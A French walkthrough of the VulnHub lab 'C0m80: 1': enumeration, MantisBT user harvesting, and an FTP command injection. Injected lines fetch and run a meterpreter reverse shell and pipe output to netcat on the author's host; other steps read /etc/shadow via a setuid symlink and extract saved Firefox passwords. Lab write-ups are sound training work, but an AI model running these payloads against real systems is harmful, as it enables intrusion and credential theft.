# Solution du CTF C0m80: 1 de VulnHub

Le CTF C0m80 téléchargeable [sur VulnHub](https://www.vulnhub.com/entry/c0m80-1,198/) est un boot2root créé par [3mrgnc3](https://twitter.com/@3mrgnc3).  

Ce CTF a été intéressant, agréable à résoudre tout en étant suffisamment compliqué, bref du bon boulot qui donne envie de se pencher sur les autres CTF du même auteur :)   

Enumerate all the things
------------------------

```plain
Nmap scan report for 192.168.1.19
Host is up (0.00085s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: BestestSoftware Ltd.
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      39064/tcp  mountd
|   100005  1,2,3      48032/udp  mountd
|   100021  1,3,4      45157/tcp  nlockmgr
|   100021  1,3,4      54188/udp  nlockmgr
|   100024  1          40606/tcp  status
|   100024  1          48453/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: C0M80)
445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: C0M80)
2049/tcp  open  nfs         2-4 (RPC #100003)
20021/tcp open  unknown
38320/tcp open  mountd      1-3 (RPC #100005)
39064/tcp open  mountd      1-3 (RPC #100005)
40606/tcp open  status      1 (RPC #100024)
45157/tcp open  nlockmgr    1-4 (RPC #100021)
53699/tcp open  mountd      1-3 (RPC #100005)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port20021-TCP:V=7.01%I=7%D=2/11%Time=5A804D4C%P=x86_64-pc-linux-gnu%r(N
SF:ULL,28,"220\x20bestFTPserver\x201\.0\.4\x20ready\.\.\.\nftp>\0\0\0")%r(
SF:GenericLines,45,"220\x20bestFTPserver\x201\.0\.4\x20ready\.\.\.\nftp>\0
SF:\0\x00502\x20Unknown\x20ftp\x20command\nftp>\0")%r(GetRequest,64,"220\x
SF:20bestFTPserver\x201\.0\.4\x20ready\.\.\.\nftp>\0\0\0\(remote-file\)\x2
SF:0\nusage:\x20get\x20remote-file\x20\[\x20local-file\x20\]\nftp>\0\0\0")
SF:%r(HTTPOptions,45,"220\x20bestFTPserver\x201\.0\.4\x20ready\.\.\.\nftp>
SF:\0\0\x00502\x20Unknown\x20ftp\x20command\nftp>\0")%r(RTSPRequest,45,"22
SF:0\x20bestFTPserver\x201\.0\.4\x20ready\.\.\.\nftp>\0\0\x00502\x20Unknow
SF:n\x20ftp\x20command\nftp>\0")%r(RPCCheck,45,"220\x20bestFTPserver\x201\
SF:.0\.4\x20ready\.\.\.\nftp>\0\0\x00502\x20Unknown\x20ftp\x20command\nftp
SF:>\0")%r(DNSVersionBindReq,45,"220\x20bestFTPserver\x201\.0\.4\x20ready\
SF:.\.\.\nftp>\0\0\x00502\x20Unknown\x20ftp\x20command\nftp>\0")%r(DNSStat
SF:usRequest,45,"220\x20bestFTPserver\x201\.0\.4\x20ready\.\.\.\nftp>\0\0\
SF:x00502\x20Unknown\x20ftp\x20command\nftp>\0")%r(Help,37A,"220\x20bestFT
SF:Pserver\x201\.0\.4\x20ready\.\.\.\nftp>\0\0\0Commands\x20may\x20be\x20a
SF:bbreviated\.\nCommands\x20are:\n!\t\tdir\t\tmdelete\t\tqc\t\tsite\n\$\t
SF:\tdisconnect\tmdir\t\tsendport\tsize\naccount\t\texit\t\tmget\t\tput\t\
SF:tstatus\nappend\t\tform\t\tmkdir\t\tpwd\t\tstruct\nascii\t\tget\t\tmls\
SF:t\tquit\t\tsystem\nbell\t\tglob\t\tmode\t\tquote\t\tsunique\nbinary\t\t
SF:hash\t\tmodtime\t\trecv\t\ttenex\nbye\t\thelp\t\tmput\t\treget\t\ttick\
SF:ncase\t\tidle\t\tnewer\t\trstatus\t\ttrace\ncd\t\timage\t\tnmap\t\trhel
SF:p\t\ttype\ncdup\t\tipany\t\tnlist\t\trename\t\tuser\nchmod\t\tipv4\t\tn
SF:trans\t\treset\t\tumask\nclose\t\tipv6\t\topen\t\trestart\t\tverbose\nc
SF:r\t\tlcd\t\tprompt\t\trmdir\t\t\?\ndelete\t\tls\t\tpassive\t\tdesert\nd
SF:ebug\t\tmacdef\t\tproxy\t\tsend\nftp>\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0");
MAC Address: 08:00:27:63:32:5B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

En dehors du serveur web prétendant être IIS 6.0, du serveur Samba (intéressant), du serveur NFS (g0tr00t?) on remarque un serveur FTP sur le port 20021 se présentant comme *bestFTPserver* (c'est ce qu'on verra).  

Nmap nous donne quelques infos supplémentaires sur SMB :  

```plain
Host script results:
|_nbstat: NetBIOS name: C0M80, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: c0m80
|   NetBIOS computer name: C0M80
|   Domain name:
|   FQDN: c0m80
|_  System time: 2018-02-11T14:06:10+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol
```

On peut voir que le service des partages est actif (présence du 20) :  

```plain
$ nmblookup -A 192.168.1.19
Looking up status of 192.168.1.19
        C0M80           <00> -         B <ACTIVE>
        C0M80           <03> -         B <ACTIVE>
        C0M80           <20> -         B <ACTIVE>
        WORKGROUP       <00> - <GROUP> B <ACTIVE>
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>

        MAC Address = 00-00-00-00-00-00
```

Malheureusement on ne trouve que l'imprimante du réseau local, pas d'accès au disque :  

```plain
smbclient -I 192.168.1.19 -L COM80 -N
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (C0m80 server (Samba, Ubuntu))
        Deskjet-2050-J510 Printer   Deskjet_2050_J510 @ linux-v85f
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

        Server               Comment
        ---------            -------
        C0M80                C0m80 server (Samba, Ubuntu)

        Workgroup            Master
        ---------            -------
        WORKGROUP
```

J'ai alors décidé de jeter un œil au site qui est celui de l'éditeur de logiciel fictif *BestestSoftware* qui a à son actif les logiciels *bestFTPserver*, NotepadPussPuss++ (toute ressemblance...) et *AutomaToro*.  

Et à l'URL */bugs/* (que l'on peut trouver via un crawler ou un buster car il y a un lien sans texte sur la page dédiée à *bestFTPserver*) se trouve un bug tracker *MantisBT*.  

Voici d'ailleurs le résultat du module buster de Wapiti :  

```plain
[*] Launching module buster
Found webpage http://192.168.1.19/images
Found webpage http://192.168.1.19/_vti_cnf
Found webpage http://192.168.1.19/assets
Found webpage http://192.168.1.19/_vti_bin
Found webpage http://192.168.1.19/README.txt
Found webpage http://192.168.1.19/favicon.ico
Found webpage http://192.168.1.19/bin
Found webpage http://192.168.1.19/dev
Found webpage http://192.168.1.19/bugs
Found webpage http://192.168.1.19/LICENSE.txt
Found webpage http://192.168.1.19/_vti_log
Found webpage http://192.168.1.19/bugs/images
Found webpage http://192.168.1.19/bugs/css
Found webpage http://192.168.1.19/bugs/js
Found webpage http://192.168.1.19/bugs/index.php
Found webpage http://192.168.1.19/bugs/lang
Found webpage http://192.168.1.19/bugs/config
Found webpage http://192.168.1.19/bugs/admin
Found webpage http://192.168.1.19/bugs/plugins
Found webpage http://192.168.1.19/bugs/view.php
Found webpage http://192.168.1.19/bugs/search.php
Found webpage http://192.168.1.19/bugs/scripts
Found webpage http://192.168.1.19/bugs/doc
Found webpage http://192.168.1.19/bugs/core.php
Found webpage http://192.168.1.19/bugs/fonts
Found webpage http://192.168.1.19/bugs/library
Found webpage http://192.168.1.19/bugs/plugin.php
Found webpage http://192.168.1.19/bugs/core
Found webpage http://192.168.1.19/bugs/api
Found webpage http://192.168.1.19/bugs/wiki.php
Found webpage http://192.168.1.19/bugs/debug
```

Aucun des dossiers /bin et /dev ne donnent un listing des fichiers. Toutefois il est tentant de chercher des exécutables dans le dossier bin, ce qui s'avère fructueux :  

```plain
http://192.168.1.19/bin/ftp.exe - HTTP 200 (675328 bytes, plain)
```

L'exécutable semble packé et pour ne pas perdre du temps inutilement je l'ai soumis à des sandbox en ligne : [sandbox.pikker.ee (Cuckoo based)](https://sandbox.pikker.ee/) et [Hybrid-Analysis](https://www.hybrid-analysis.com/).  

Il semble que le binaire soit packé avec UPX 1.25 (mais les noms classiques des sections n'apparaissent pas) et l'exécutable à des infos de copyright faisant référence à [Xlight FTP Server](http://www.xlightftpd.com/) en version 3.8.8.  

![Xlight FTP Server copyright and version infos](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_xlightftp_version.png)

Les captures prises par les sandbox confirment le nom du logiciel mais le numéro de version n’apparaît pas.  

La documentation du site parle de différents fichiers de configuration mais aucun n'est trouvable dans le dossier */bin*.  

On retrouve [une page](http://processchecker.com/file/xlight.exe.html) mentionnant *XLight* si l'on recherche le hash MD5 de l'exécutable.  

Sur *exploit-db* il y a plusieurs exploits pour *XLight* mais [seulement un](https://www.exploit-db.com/exploits/43135/) correspond à la version mais les conditions d'exploitation ont peu de sens et qui plus est il ne s'agit que d'un PoC (crash).  

Pour ce qui est du dossier */dev* on trouve un fichier *info.php* qui est bien sûr un *phpinfo()* correspondant à une installation de XAMPP.  

On remarque un *DOCUMENT\_ROOT* défini à *C:/xampp/wwwroot*.  

Bizarrement le *SCRIPT\_FILENAME* est *C:/xampp/wwwroot/uploads/info.php* alors que l'on a demandé le dossier */dev* mais c'est peut être une histoire de mapping Apache...  
.
Dans les autres infos utiles il y a la variable *HOMEPATH* valant *\Users\bob* et le PATH qui contient les chemins d'installation de Python 2.7 et PowerShell...  

A ce stade, on peut se servir de rpclient pour vérifier l'existence de quelques utilisateurs :  

```plain
$ rpcclient -U "" 192.168.1.19
Enter 's password:
rpcclient $> srvinfo
        C0M80          Wk Sv PrQ Unx NT SNT C0m80 server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
rpcclient $> enumdomains
name:[C0M80] idx:[0x0]
name:[Builtin] idx:[0x1]
rpcclient $> lookupnames administrators
administrators S-1-5-32-544 (Local Group: 4)
rpcclient $> lookupnames bob
bob S-1-22-2-1000 (Domain Group: 2)
rpcclient $> lookupnames dev
result was NT_STATUS_NONE_MAPPED
rpcclient $> lookupnames bin
bin S-1-22-1-2 (User: 1)
```

Need For Security
-----------------

C'est le moment de se pencher sur le NFS.  

Une fois installé les outils nécessaires (paquet *nfs-common* sous Ubuntu), on peut lister les points de montage et y accéder :  

```plain
$ showmount -e 192.168.1.19
Export list for 192.168.1.19:
/ftpsvr/bkp *
$ sudo mount 192.168.1.19:/ftpsvr/bkp /mnt
```

On trouve sur ce partage un fichier énigmatique :  

```plain
-rw-r--r-- 1 backup backup 2757002 févr. 11 11:21 ftp104.bkp
```

Et encore plus intéressant, ce même fichier est trouvable dans */dev*.  

Petite appartée pour ceux qui ne connaissent pas NFS :  

*Network File System* est un peu l’ancêtre de Samba et d'autres protocoles de partage de fichiers. Créé en 1984, il n'était pas pensé avec la sécurité en tête, les accès aux fichiers étant vérifiés via les UID et GID de l'utilisateur se connectant au service, il était facile de les falsifier, soit par exemple en créant un utilisateur local avec un couple UID/GID identique à ceux du fichier, soit en utilisant un outil d'attaque spécifique comme [NFSShell](https://github.com/NetDirect/nfsshell).  

Dès lors, et si le système de fichier sur la cible le permet, il y aura inévitablement un moment dans le CTF où l'on se connectera sur le NFS pour déposer une backdoor setuid 0 qui nous permettra de passer root, une fois que l'on aura récupéré un accès local restreint.  

La suite du challenge nous montrera que cette hypothèse est la bonne, en revanche si on pose une backdoor PHP sur le partage on ne la retrouve ni dans */dev* ni dans */bin* comme quoi le dossier web n'est pas le même que le point de montage NFS... cela aurait été trop simple :D   

Pour ce qui est du fichier *.bkp* il s'avère qu'il s'agit d'un export réalisé avec la commande *xxd* avec deux lignes d'entête supplémentaires :  

```plain
Mon Feb 11 10:19:01 GMT 2018
------------------------------------------------------------------
0000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  (!..............
0000010: b800 0000 0000 0000 4000 0000 0000 0000  ........ .......
0000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000030: 0000 0000 0000 0000 0000 0000 8000 0000  ................
0000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ...........<....
--- snip ---
```

En dehors du fait qu'il y avait plusieurs fichiers présents dans le dump, ce que je n'ai pas vu à ce moment là, il y a un autre détail que je n'ai pas remarqué... S'aura tu le retrouver ? :p   

Le fichier original obtenu via *xxd -r ftp104.bkp output* s'avère être un exécutable... peu exploitable ^\_^  

```plain
$ file output
output: MS-DOS executable, MZ for MS-DOS
```

En effet le programme ne veut pas fonctionner, que ce soit via *Wine* ou directement depuis Windows :(  

Hacker bien sous tous rapports cherche bug \*
---------------------------------------------

\* pour pénétration  

A ce stade on a bien un scénario final d'exploitation mais on n'a pas vraiment avancé... Certes on dispose d'un utilisateur (*bob*) mais des tentatives de brute force sur FTP/SMB ont été vaines.  

Il est temps de se pencher sur le bug tracker présent.  

Dans */bugs/doc/en-US/Admin\_Guide/* se trouve un manuel *MantisBT-2.0-Admin\_Guide-en-US.pdf* avec la mention 2016, ce qui nous permet d'estimer la version du *MantisBT*.  

Sur *exploit-db*, il y a une vulnérabilité de password-reset qui s'avère prometteuse mais qui après plusieurs essais ne semble pas fonctionner sur notre cible (patchée ?) car même si on parvient sur le formulaire de réinitialisation du mot de passe, le changement ne semble pas être pris en compte.  

Ce qui ressort de cette vulnérabilité et de [la vidéo citée](https://vimeo.com/213144905) c'est tout de même qu'on peut facilement énumérer les utilisateurs existants en incrémentant l'ID dans l'URL suivante (l'auteur du challenge demandait à ce qu'on rajoute une entrée dans le /etc/hosts) :  

```plain
http://c0m80.ctf/bugs/verify.php?id=1&confirm_hash=
```

Un script rapide :  

```python
import requests
from bs4 import BeautifulSoup

MAX_ID = 1000

sess = requests.session()
for i in range(MAX_ID):
    url = "http://c0m80.ctf/bugs/verify.php?id={}&confirm_hash=".format(i)
    response = sess.get(url)
    soup = BeautifulSoup(response.text, "lxml")
    input_tag = soup.find("input", id="realname", value=True)
    if input_tag:
        print("Found user id {}: '{}'".format(i, input_tag["value"]))
```

Nous ramène une petite liste d'utilisateurs :  

```plain
Found user id 1: 'bob'
Found user id 2: 'guest'
Found user id 3: 'Jeff Deucette'
Found user id 4: 'alice'
Found user id 5: 'Mr Don Cheung'
```

Et victoire... on peut se connecter sur le *Mantis* avec *guest / guest*.  

Avec les droits dont on dispose on peut consulter la discussion sur le bug 6 pour le projet *NotepadPussPuss++* (on y trouve un lien vers l'archive *http://c0m80.ctf/bin/npp.zip*) et celle pour le bug 3 du projet *bestFTPserver\_public*.  

![C0m80 MantisBT capture](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_bug3.png)

Evidemment le lien vers le CVE est là pour nous troller :p  

Bon, on sait qu'il faut exploiter une faille dans le serveur FTP... mais l'exécutable que j'ai est corrompu....  

Errances
--------

N'ayant toujours pas remarqué le *truc*, j'ai testé différentes choses. Par exemple *enum4linux* m'a trouvé des utilisateurs supplémentaires sur le Samba :  

```plain
enum4linux
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\b0b (Local User)
S-1-22-1-1001 Unix User\al1ce (Local User)
```

Je me suis dit que le fichier *.bkp* était peut être un dump mémoire du coup j'ai tenté de récupérer le fichier sur le NFS à divers étapes où je me connectais parallèlement au serveur FTP... il s'est avéré que le dump avait toujours la même somme MD5 :D   

J'ai aussi découvert au boût d'un moment que le serveur FTP (port 20021) est accessible sans authentification (quand je pense au temps passé sur le brute force...)  

```plain
ftp>ls
200 PORT command successful
---> LIST
150 Opening ASCII mode data connection for /bin/ls (109 bytes).
drw-rw-rw- 1 ftp ftp                0 Sep 15 18:05 .
drw-rw-rw- 1 ftp ftp                0 Sep 15 18:05 ..
drw-rw-rw- 1 ftp ftp              256 Sep 15 20:59 wwwroot
226 Transfer complete.

ftp>cd wwwroot
250 Directory successfully changed
"/"
ftp>ls
200 PORT command successful
---> LIST
150 Opening ASCII mode data connection for /bin/ls (109 bytes).
drw-rw-rw- 1 ftp ftp                0 Sep 15 18:05 .
drw-rw-rw- 1 ftp ftp                0 Sep 15 18:05 ..
drw-rw-rw- 1 ftp ftp              256 Sep 15 20:59 wwwroot
226 Transfer complete.
ftp>help
Commands may be abbreviated.
Commands are:
!               dir             mdelete         qc              site
$               disconnect      mdir            sendport        size
account         exit            mget            put             status
append          form            mkdir           pwd             struct
ascii           get             mls             quit            system
bell            glob            mode            quote           sunique
binary          hash            modtime         recv            tenex
bye             help            mput            reget           tick
case            idle            newer           rstatus         trace
cd              image           nmap            rhelp           type
cdup            ipany           nlist           rename          user
chmod           ipv4            ntrans          reset           umask
close           ipv6            open            restart         verbose
cr              lcd             prompt          rmdir           ?
delete          ls              passive         desert
debug           macdef          proxy           send
ftp>system
Bob was supposed to do this too!
He said there might be a BOUF in one of the commands to fix first?
Whatever that is? LOL
He spends too much time listening to his old cd's if you ask me!

Alice ;D
ftp>desert
Mmmnn..
We all love desert ;P
have an easteregg: http://bit.ly/2xXQmXZ

ftp>status
Connected to 127.0.0.1
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Backup path: C:\wwwroot\dev\ftp104.bkp
Verbose: on; Bell: off; Prompting: off; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: off
Tick counter printing: off
```

Pour info le easteregg redirige vers *http://c0m80.ctf/bugs/easteregg/* qui correspond [à ce jeu](http://www.ellison.rocks/clumsy-bird/).  

J'ai aussi réussi à faire crasher le serveur en tentant une simple remontée dans l'arborescence avec la commande *cd*, ce qui valide le fait qu'il y ait un buffer-overflow sur cette commande (j'y reviendrais en bonus).  

L'exécutable résultant du xxd contenant quelques références à des fichiers (*bestFTPserver.c*, *bfsvrdll.c*, *bfsvrdll.dll*, j'ai bien évidemment essayé de les retrouver sur la racine web.  

Touché par la grace
-------------------

Au boût d'un moment j'ai tout de même compris que le dump xxd n'était pas dans un format valide, en particulier la dernière colonne qui contient les caractères imprimables ne correspond pas aux codes hexa (on aurait du voir *MZ* figurer)... voilà voilà.  

Du coup pour le décodage on sera mieux servi par soit même :  

```python
import sys
from binascii import unhexlify

with open(sys.argv[1]) as fd_in:
    with open(sys.argv[2], "wb") as fd_out:
        for i, line in enumerate(fd_in):
            if i > 1:
                hex_list = line.split(" ")[1:9]
                for hex_bytes in hex_list:
                    fd_out.write(unhexlify(hex_bytes))
```

Une fois qu'on a l'exécutable entier dans les mains, ça va plus vite.  

Je ne vais pas mettre ici des quantités de code assembleur mais pour résumer à chaque connexion un thread est lancé qui exécute la fonction 0x00401ad3 (*sym.\_ConnectionHandler\_4*).  

Il y a alors un enchaînement de *if/else if* pour comparer la commande reçue avec les commandes existantes via *str(n)cmp*.  

On découvre comme ça les commandes cachées *Send-Report* et *Report-Link* mais aussi un traitement particulier si on passe une URL (texte commençant par *http:* ou *https:*) puisque le code fait appel à *system("explorer \_le\_lien\_passé\_")* ce qui laisse supposer une belle injection de commande, auquel cas pas de *BOUF* à exploiter. Elle est pas belle la life ?  

Au passage voici l'output de l'une des commandes cachées :  

```plain
ftp>Send-Report
AWESOME BOB'S REPORTING FEATURE!

  This tool will auto-send bug report info to my browser BugTracker

  (INFO)
I've not set up the MantisBT site fully yet just dump any reports
on github or pastebin & I'll view them manually for now.
I've added a feature to bestFTPserver for this.

  Regards.
  Bob ;)

USE CMD: Report-Link
```

Debug and pwn (or die tryin)
----------------------------

Si on veut exécuter le serveur depuis une VM Windows le programme nous indique qu'il a besoin de *bfsvrdll.dll* qui est une librairie maison... trouvable nulle part sur le web.  

Il y a en effet un import qui est fait de la fonction \_EssentialFunc1 de ladite dll.  

Solution ? On cross-compile une dll contenant une fonction avec le même nom et qui ne fait rien (la flemme de récupérer un CodeBlocks et de retrouver les bon paramètres).  

Mingw f0r t3h w!nZ:  

```c
#include <windows.h>
// /usr/bin/i686-w64-mingw32-gcc -o bfsvrdll.o -c bfsvrdll.c
// /usr/bin/i686-w64-mingw32-gcc -o bfsvrdll.dll -s -shared bfsvrdll.o -Wl,--subsystem,windows
__declspec(dllexport) void EssentialFunc1(void)
{
}
```

Une fois le serveur lancé en local on peut faire notre essai d'injection de commande :  

```plain
http://www.perdu.com/ & echo PWNED > c:/windows/temp/yolo.txt & notepad c:/windows/temp/yolo.txt &
```

![c0m80 command injection test](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_ftp_command_injection.png)

Dès lors j'ai tenté quelques injections sympas Windows related :  

```plain
http://perdu.com/ & powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.1.3/met_win32_rev_tcp_192_168_1_3_9999.exe', 'shell.exe')" & shell.exe &
```

ou profitant de la présence de Python dans le path :  

```plain
http://www.perdu.com/ & python -c "import urllib;urllib.urlretrieve('http://192.168.1.3/met_win32_rev_tcp_192_168_1_3_9999.exe', 'shell.exe')" & shell.exe &
```

Nada, peanuts, pas un kopec...Le *phpinfo()* du début est un gros troll, il suffit de voir que le User-Agent indiqué correspond pas au mien pour le comprendre :p   

Mettons nous en situation
-------------------------

Comme le serveur FTP semble être exécuté dans un environnement Wine assez basique, le mieux est d'exécuter le programme depuis Wine aussi et voir ce qu'il est possible d'un faire.  

Et si vous tapez *help* après avoir lancé l'invite de commande avec *wine cmd.exe* vous verrez qu'on ne peut pas faire grand chose...  

Après avoir bien fouillé j'ai trouvé que l'on peut appeler des programmes Unix avec *start /unix* mais l'utilisation des PIPE entre deux commandes ne fonctionnait pas comme attendu (si on tente d'exécuter une commande et d'envoyer l'output via un netcat, la connexion sortante s'établie mais se ferme aussitôt sans envoyer les données).  

Je suppose que l'output des commandes Unix n'est pas sensé passer via la PIPE Windows... quoiqu'il en soit le problème est résolu si on parvient à tout "piper" dans une même commande Unix :  

```plain
ftp>http: & start /unix /usr/bin/python -c "import os;os.system('id | netcat 192.168.1.6 7777')"
BugReport Link Sent to Bob...
```

Et là qui voilà ?  

```plain
ncat -l -p 7777 -v
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 192.168.1.19.
Ncat: Connection from 192.168.1.19:48402.
uid=1000(b0b) gid=1001(b0b) groups=1001(b0b)
```

On trouve une clé privée SSH pour l'utilisateur. D'ailleurs un serveur SSH est en écoute sur localhost sur le port 65122. Même après un socat pour rediriger la connexion on ne parvient pas pour autant à se connecter. Une backdoor python classique fera bien l'affaire.  

*b0b* dispose de plusieurs fichiers dans son *Desktop/* qui sont respectivement *notes.txt*, *pwds.txt* et *.save~* dont voici les contenus :  

```plain
These are my notes...
---------------------
I prefer the old fasioned ways of doing things if I'm honest

1. Remember to prank Jeff with Alice :D

2. Buy Metallica tickets for me and Alice for next month.

3. Call Mom for her birthday on Thursday, and remeber to take flowers at the weekend.

4. Draft a resignation letter as Jeff to send to Mr Cheong. LOL :D
```

```plain
## Reminder to self!
I moved all my passwords to a new password manager
```

```plain
## Reminder to self!
Get a password manager!

VNC-PASS:Al1ce1smyB3stfi3nd$12345qwert
```

On trouve un autre fichier *.save~* dans le dossier *.ssh* :  

```plain
###### NO PASWORD HERE SRY ######

I'm using my new password manager

           PWMangr2

      just a note to say

   WELL DONE & KEEP IT UP ;D

#################################
```

al1ce 1n w0nd3rl4nd
-------------------

Arrivé à ce stade j'ai tenté de me connecter sur la mire de connexion Gnome (qui imite un WindowsXP) dans la machine virtuelle car c'était indiqué qu'on devrait le faire à un moment.  

Après quelques difficultés (allez taper un mot de passe aussi long avec un clavier azerty sur un système qwerty) force est de constater que le mot de passe n'est pas celui attendu...  

Il est temps de se promener un peu sur le système...  

```plain
$ lsb_release -a
No LSB modules are available.
Distributor ID: WondawsXP
Description:    WondawsXP SP7.4 C0M80-CR15PY
Release:        3601
Codename:       C0m80

Linux C0m80 3.13.0-129-generic #178-Ubuntu SMP Fri Aug 11 12:49:13 UTC 2017 i686 i686 i686 GNU/Linux
```

La blague jusqu'au boût :)  

C'est sans doute le moment de se pencher sur le partage NFS.  

```plain
ls -alR /ftpsvr
/ftpsvr:
total 676
drwxr-xr-x  3 b0b  b0b      4096 Sep 23 01:07 .
drwxr-xr-x 23 root root    12288 Feb 17 15:28 ..
-rwxr-x---  1 b0b  b0b      3129 Sep 22 18:43 BestestSoftware.png
-rwxr-xr-x  1 b0b  b0b    379576 Sep 23 18:25 bestFTPserver.exe
-rwxr-xr-x  1 b0b  b0b    278766 Sep 23 18:25 bfsvrdll.dll
drwxrwx---  2 root backup   4096 Feb 18 14:18 bkp
-rwxr-xr-x  1 b0b  b0b        89 Sep 23 01:28 ftpsvr.sh
```

Hmmm, le partage NFS n'est pas accessible par b0b...  

Même si on monte le partage en root pour placer un binaire setuid 0, il faudrait être membre du groupe backup pour l'exécuter ensuite sur le système.  

Le script shell ne nous offre pas grand chose puisqu'il tourne en tant que b0b :  

```plain
#!/bin/bash
while true
do
        wine /ftpsvr/bestFTPserver.exe && winekill && sleep 60
done
```

Par contre al1ce dispose des bons droits :  

```plain
uid=1001(al1ce) gid=34(backup) groups=34(backup)
```

On peut normalement se connecter au compte d'al1ce avec la clé SSH de b0b :  

```plain
b0b@C0m80:/home$ cat al1ce/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC--- snip nevermind ---tB9qKxMKM3x b0b@C0m80
```

Mais même après avoir recopié un client SSH (puisqu’il a été supprimé ici) pris sur une Ubuntu 32bits on obtient un message d'erreur :  

```plain
Agent admitted failure to sign using the key.
```

Et après quelques recherches si on essaye de bypasser ça avec la commande suivante :  

```plain
SSH_AUTH_SOCK=0 ./ssh -p 65122 al1ce@localhost
```

La passphrase de b0b pour la clé SSH est demandée...  

J'ai compris plus tard (voir plus loin) qu'un pass-manager graphique est défini pour la saisie de la pass-phrase ce qui explique le premier message d'erreur depuis notre shell.  

La seconde commande désactive l'utilisation du pass-manager mais du coup il faut saisir la passphrase et aucun des passwords à notre disposition ne fait l'affaire.  

On trouve un script intéressant dans le dossier d'*al1ce* :  

```bash
#!/bin/bash
# I wrote a quick tool for you bob
# this will backup the ftp app file to the net share
makebkp
```

Cela fait référence à un binaire setuid :  

```plain
---S--S--x 1 root backup 7382 Sep 23 01:54 /usr/local/bin/makebkp
```

Comme on s'y attend c'est ce programme qui fait un xxd de */ftpsvr/bestFTPserver.exe* et stocke le résultat dans *ftp104.bkp*.  

Comme on a les droits sur */ftpsvr* on peut supprimer *bestFTPserver.exe* et le réutiliser comme lien symbolique vers un fichier quelconque du système, permettant ainsi d'obtenir son contenu, comme */etc/shadow* :  

```plain
root:*:17432:0:99999:7:::
b0b:$6$m67feRp8$mX2RwnX4Q2kB6bdsIbDHQiSnTkrEX3tGRd2qvoys03fyxcJ1022Gzedx0Atj3hhFxcBX.w43tSEUQ6oZZQZQ2.:17432:0:99999:7:::
al1ce:!:17431:0:99999:7:::
```

L'auteur du CTF a pensé à tout :p   

J'ai tenté d'exploiter par différents moyens l'appel à xxd sans résultats.  

Dans le */home* de *b0b* on peut trouver un profil Firefox.  

J'ai eu recours à un outil de *NirSoft* baptisé [PasswordFox](https://www.nirsoft.net/utils/passwordfox.html) pour extraire les mots de passe enregistrés dans le navigateur.  

Le programme demande deux dossiers : le dossier profil de l'utilisateur et le dossier d'installation de Firefox qu'il aura préalablement fallut récupérer en local.  

![C0m80 PasswordFox passwords extraction](https://raw.githubusercontent.com/devl00p/blog/master/images/c0m80/c0m80_passwordfox.png)

